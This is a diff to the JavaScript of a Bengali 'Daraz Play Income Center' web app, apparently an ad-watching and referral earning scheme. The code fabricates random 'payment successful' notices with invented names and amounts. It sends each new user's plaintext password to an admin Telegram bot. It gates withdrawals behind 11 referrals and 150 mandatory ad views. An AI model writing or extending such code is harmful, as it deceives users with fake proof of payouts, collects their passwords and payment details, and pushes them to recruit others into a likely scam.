         alert("⚠️ এই ফোন নাম্বারে ইতিমধ্যে একটি অ্যাকাউন্ট রেজিস্টার্ড রয়েছে! দয়া করে লগইন করুন।");
@@ -1518,9 +1511,7 @@ async function saveUserDataAndRegister(phone, name, password, photoUrl, photoFil
             }
         }
 
-        await notifyAdminNewUser(userSerial, name, phone, password, joinDateFormatted, photoFile);
-        
-        // ফিচার ৮: সফল রেজিস্ট্রেশনের পর অটো-লগইন ও অভিনন্দন পপ-আপ
+        await notifyAdminNewUser(userSerial, name, phone, password, joinDateFormatted, photoUrl, photoFile);
         document.getElementById('register-success-modal').classList.add('active');
     } catch (err) {
         console.error(err);
@@ -1535,7 +1526,6 @@ async function closeRegisterSuccessModal() {
     initDashboard(currentUserPhone);
 }
 
-// পাসওয়ার্ড ভুলে গেছেন (Forgot Password) ফ্লো
 function openForgotPasswordModal() {
     document.getElementById('forgot-phone').value = '';
     document.getElementById('entered-forgot-otp').value = '';
@@ -1746,7 +1736,7 @@ async function startDynamicPaymentNotifications() {
         let method = methods[Math.floor(Math.random() * methods.length)];
         let amount = amounts[Math.floor(Math.random() * amounts.length)];
         let rndId = Math.floor(1000 + Math.random() * 9000);
-        paymentMessages.push(`🔥 পেমেন্ট সফল: ${fName} ${lName} (ID: ...${rndId}) ${method}-এর মাধ্যমে ${amount} পেমেন্ট পেয়েছেন! 💰`);
+        paymentMessages.push(`💎 পেমেন্ট সফল: ${fName} ${lName} (ID: ...${rndId}) ${method}-এর মাধ্যমে ${amount} পেমেন্ট পেয়েছেন! 💰`);
     }
 
     const noticeBar = document.querySelector('.notice-bar');
@@ -1943,7 +1933,6 @@ function renderPaymentCards(dataList) {
     dataList.forEach(data => {
         const method = (data.method || 'bkash').toLowerCase();
         const amountCoins = data.amount || 1000;
-        // ফিচার ৩: প্রতি হাজারে ২০ টাকা হারে হিসাব
         const calculatedTaka = (amountCoins / 1000) * 20;
         const number = maskPhoneNumber(data.number || '---');
         let statusKey = data.status || 'pending';
@@ -1955,14 +1944,20 @@ function renderPaymentCards(dataList) {
             `<div class="ph-status-badge success"><span>✅ পেমেন্ট সফল</span></div>` :
             `<div class="ph-status-badge pending"><span>⏳ পেন্ডিং</span></div>`;
 
+        let timeStr = "";
+        if (data.time && data.time.toDate) {
+            let dt = data.time.toDate();
+            timeStr = dt.toLocaleDateString('bn-BD', { day: 'numeric', month: 'short', year: 'numeric' }) + ', ' + dt.toLocaleTimeString('bn-BD', { hour: '2-digit', minute: '2-digit' });
+        }
+
         const card = document.createElement('div');
         card.className = `payment-history-card ${statusKey === 'paid' ? 'success' : 'pending'}`;
         card.innerHTML = `
             <div class="ph-left">
                 <div class="${logoClass}">${logoText}</div>
                 <div class="ph-info">
-                    <div class="ph-amount">${calculatedTaka} টাকা</div>
-                    <div class="ph-details">নাম্বার: ${number}</div>
+                    <div class="ph-amount">${calculatedTaka} টাকা (${amountCoins} কয়েন)</div>
+                    <div class="ph-details">নাম্বার: ${number}<br>📅 ${timeStr}</div>
                 </div>
             </div>
             <div>${badgeHtml}</div>
@@ -2019,17 +2014,9 @@ async function watchMandatoryAd() {
     alert("🎉 ১টি স্পেশাল ভিডিও দেখা সম্পন্ন হয়েছে! (" + mandatoryWatched + "/150)");
 }
 
-// ফিচার ৪ ও ৫: শর্ত সাপেক্ষে উইথড্র এবং পেমেন্ট ফর্ম পপ-আপ
+// ওয়ালেট পেজে শর্ত চেক করে উইথড্র ফর্ম ওপেন করার ফাংশন
 function processWithdraw() {
-    const amountField = document.getElementById("withdraw-amount").value;
-    const rawNum = document.getElementById("withdraw-number").value;
-    const number = normalizePhoneNumber(rawNum);
-    const method = document.getElementById("payment-method").value;
-    const amount = parseFloat(amountField);
-    
-    if (!number || !amountField) { alert("সব তথ্য পূরণ করুন।"); return; }
-    if (amount < 1000) { alert("ন্যূনতম ১০০০ কয়েন প্রয়োজন!"); return; }
-    if (amount > userBalance) { alert("পর্যাপ্ত ব্যালেন্স নেই!"); return; }
+    if (userBalance < 1000) { alert("⚠️ ন্যূনতম ১০০০ কয়েন প্রয়োজন!"); return; }
     
     if (totalRefers < 11) {
         document.getElementById('modal-current-ref').innerText = totalRefers;
@@ -2055,10 +2042,9 @@ function processWithdraw() {
         return;
     }
 
-    // সমস্ত শর্ত পূরণ হলে প্রিমিয়াম পেমেন্ট ফর্ম পপ-আপ দেখানো (ফিচার ৫)
     document.getElementById('wd-full-name').value = userName || '';
-    document.getElementById('wd-phone-number').value = number;
-    document.getElementById('wd-coin-amount').value = amount;
+    document.getElementById('wd-phone-number').value = '';
+    document.getElementById('wd-coin-amount').value = '';
     document.getElementById('withdraw-modal').classList.add('active');
 }
 
@@ -2066,7 +2052,17 @@ function closeWithdrawModal() {
     document.getElementById('withdraw-modal').classList.remove('active');
 }
 
-// ফিচার ৩ ও ৫: ফর্ম সাবমিট ও এডমিন টেলিগ্রাম বটে নোটিফিকেশন পাঠানো
+function closeWithdrawSuccessModal() {
+    document.getElementById('withdraw-success-modal').classList.remove('active');
+}
+
+function goToWithdrawHistoryPage() {
+    closeWithdrawSuccessModal();
+    loadPaymentHistory();
+    switchPage('payment-history', null);
+}
+
+// পেমেন্ট সাবমিট এবং টেলিগ্রাম বটে নোটিফিকেশন পাঠানোর ফাংশন
 async function submitWithdrawFormToAdmin() {
     const name = document.getElementById('wd-full-name').value.trim();
     const photoFile = document.getElementById('wd-photo').files[0];
@@ -2074,20 +2070,18 @@ async function submitWithdrawFormToAdmin() {
     const number = normalizePhoneNumber(rawNum);
     const amountField = document.getElementById('wd-coin-amount').value;
     const amount = parseFloat(amountField);
-    const method = document.getElementById("payment-method").value;
+    const method = document.getElementById("withdraw-method").value;
 
     if (!name || !number || !amountField) {
         alert("দয়া করে সকল তথ্য পূরণ করুন!");
         return;
     }
     if (amount < 1000 || amount > userBalance) {
-        alert("সঠিক কয়েনের পরিমাণ দিন!");
+        alert("সঠিক কয়েনের পরিমাণ দিন (ন্যূনতম ১০০০ কয়েন এবং আপনার ব্যালেন্সের মধ্যে হতে হবে)!");
         return;
     }
 
-    // প্রতি হাজারে ২০ টাকা হারে হিসাব (ফিচার ৩)
     const taka = (amount / 1000) * 20;
-
     let photoUrl = userPhotoUrl || "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f464.png";
 
     if (photoFile) {
@@ -2121,8 +2115,7 @@ async function processWithdrawSubmission(name, number, amount, taka, method, pho
         updateUI();
         loadPaymentHistory();
 
-        // এডমিন টেলিগ্রাম বটে নোটিফিকেশন পাঠানো (ফিচার ৫)
-        const msg = `💳 <b>নতুন পেমেন্ট উইথড্র অনুরোধ!</b> 💸\n\n` +
+        const msg = `💳 <b>💎 নতুন পেমেন্ট উইথড্র অনুরোধ! 💎</b> 💸\n\n` +
                     `👤 <b>নাম:</b> <code>${name}</code>\n` +
                     `🆔 <b>ইউজার আইডি:</b> <code>${userId}</code>\n` +
                     `📞 <b>নম্বর:</b> <code>${number} (${method})</code>\n` +
@@ -2142,22 +2135,35 @@ async function processWithdrawSubmission(name, number, amount, taka, method, pho
                 method: 'POST',
                 body: formData
             });
-        } else {
+        } else if (photoUrl && photoUrl.startsWith('data:image')) {
+            const res = await fetch(photoUrl);
+            const blob = await res.blob();
+            const formData = new FormData();
+            formData.append('chat_id', adminChatId);
+            formData.append('caption', msg);
+            formData.append('parse_mode', 'HTML');
+            formData.append('photo', blob, 'withdraw.jpg');
+
             await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        } else {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: adminChatId,
-                    photo: photoUrl,
-                    caption: msg,
+                    text: msg,
                     parse_mode: "HTML"
                 })
             });
         }
 
-        alert("✅ পেমেন্ট অনুরোধ সফলভাবে জমা হয়েছে এবং এডমিনের কাছে পাঠানো হয়েছে! উইথড্র হিস্ট্রিতে স্ট্যাটাস পেন্ডিং দেখতে পাবেন।");
+        // সফলভাবে সাবমিট হওয়ার পর অভিনন্দন ও উইথড্র হিস্টরি চেক করার মডাল ওপেন হবে
+        document.getElementById('withdraw-success-modal').classList.add('active');
     } catch (e) {
-        console.error(e);
+        console.error("Withdraw notification error:", e);
         alert("পেমেন্ট অনুরোধ পাঠাতে সমস্যা হয়েছে।");
     }
 }
@@ -2348,7 +2354,7 @@ function getContextWelcomeHtml(contextType) {
                 আসসালামু আলাইকুম। 😊<br>
                 <b>দারাজ প্লে ইনকাম সেন্টার</b> রেফারেল সাপোর্ট সেন্টারে আপনাকে আন্তরিক স্বাগতম। এখানে রেফারেল সংক্রান্ত সকল ধরনের সহযোগিতা দ্রুত ও নির্ভরযোগ্যভাবে প্রদান করা হয়।<br><br>
                 🎁 <b>রেফারেল সুবিধাসমূহ:</b><br>
-                ✅ প্রতি সফল রেফারে ১১১ টাকা পাবেন।<br>
+                ✅ প্রতি সফল রেফারে ১১১ টাকা পাবেন。<br>
                 ✅ ১১টি সফল রেফারে মোট ১,২২১ টাকা পাবেন, যা আপনার বর্তমান ব্যালেন্সের সাথে যোগ হয়ে উত্তোলন করতে পারবেন।<br>
                 ✅ একবার রেফার সম্পন্ন হলে পুনরায় রেফারের কোনো ঝামেলা থাকবে না।<br>
                 ✅ এরপর আপনার সুবিধামতো যেকোনো সময় টাকা উত্তোলন করতে পারবেন।<br><br>
@@ -2516,7 +2522,7 @@ async function sendLiveChatMessage() {
             timestamp: firebase.firestore.FieldValue.serverTimestamp()
         });
 
-        const notifText = `💬 <b>নতুন লাইভ সাপোর্ট মেসেজ! ${topicTag}</b>\n\n` +
+        const notifText = `💎 <b>নতুন লাইভ সাপোর্ট মেসেজ! ${topicTag}</b> 💎\n\n` +
                           `👤 <b>নাম:</b> ${senderDisplayName}\n` +
                           `📞 <b>ফোন:</b> <code>${maskPhoneNumber(phone)}</code>\n` +
                           `📝 <b>মেসেজ:</b> ${text || '[ফাইল সংযুক্তি]'}\n\n` +
@@ -2771,8 +2777,7 @@ function goToMandatoryTaskPage() { closeMandatoryTaskModal(); switchPage('mandat
 function closeSpecialTaskModal() { document.getElementById('special-task-modal').classList.remove('active'); }
 function goToSpecialTaskPage() { closeSpecialTaskModal(); switchPage('special-task', null); }
 function closeActivationModal() { document.getElementById('activation-modal').classList.remove('active'); }
-function setWithdrawAmount(amt) { document.getElementById('withdraw-amount').value = amt; }
-function toggleWithdrawForm() { document.getElementById('withdraw-form-container').classList.toggle('active'); }
+function setWithdrawAmount(amt) { document.getElementById('wd-coin-amount').value = amt; }
 </script>
 </body>
 </html>
